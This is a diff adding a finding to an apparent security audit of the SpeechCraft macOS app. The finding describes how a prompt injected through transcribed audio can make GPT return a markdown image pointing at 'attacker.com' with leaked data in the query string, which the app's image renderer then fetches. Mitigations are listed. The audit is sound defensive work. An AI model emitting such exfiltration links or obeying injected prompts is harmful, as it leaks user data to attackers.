@@ -175,6 +175,37 @@ The Azure endpoint variants are user-configurable but default to OpenAI. There i
 
 ---
 
+## Finding 10 — ⚠️ MODERATE: Markdown Image Loading from GPT Responses (added post-build)
+
+**Discovered during build verification — was missed in initial audit because dependencies live in Xcode's Package.resolved, not in source code.**
+
+The project depends on three SPM packages we didn't initially audit:
+
+| Package | Stars | License | Network surface |
+|---------|-------|---------|-----------------|
+| `gonzalezreal/swift-markdown-ui` 2.4.1 | 3,800 | MIT | None in production code (network calls only in tests) |
+| `gonzalezreal/NetworkImage` 6.0.1 | 99 | MIT | **Yes — fetches arbitrary image URLs via URLSession** |
+| `swiftlang/swift-cmark` 0.7.1 | 319 | Apache-2.0-ish | None — pure C parser, Apple-owned |
+
+**The vulnerability:** `swift-markdown-ui` uses `NetworkImage` to render `![alt](url)` markdown syntax. When SpeechCraft displays the GPT response in the modal chat view (Option+A feature), any image URL in the response will be fetched automatically.
+
+**Exploitation chain:**
+1. Attacker injects a prompt that gets transcribed (background audio, hostile environment, compromised input)
+2. GPT returns markdown containing `![](https://attacker.com/log?data=...)`
+3. SpeechCraft renders the modal response
+4. `NetworkImage` fetches the URL, leaking metadata (IP, User-Agent, query params containing whatever GPT was tricked into including) to the attacker
+
+**Severity: Moderate.** Requires successful prompt injection AND use of the modal chat feature. Less catastrophic than Finding 1 (no code execution) but still a data exfiltration channel.
+
+**Mitigations to implement (Priority 2):**
+- Strip `<img>` and `![]()` tags from GPT responses before rendering
+- Or replace `swift-markdown-ui` with a renderer that disables remote image loading
+- Or allowlist image hosts (only `*.openai.com`, etc.)
+
+**Why we didn't fix this in v1 of the fork:** The AppleScript gate (Finding 1) already blocks the most dangerous prompt injection vector. The image-loading vector is real but lower-impact, and fixing it requires changing the rendering pipeline (more invasive). Filed as Priority 2.
+
+---
+
 ## Finding 9 — ✅ No Unsafe Code Patterns
 
 Static scan for dangerous patterns:
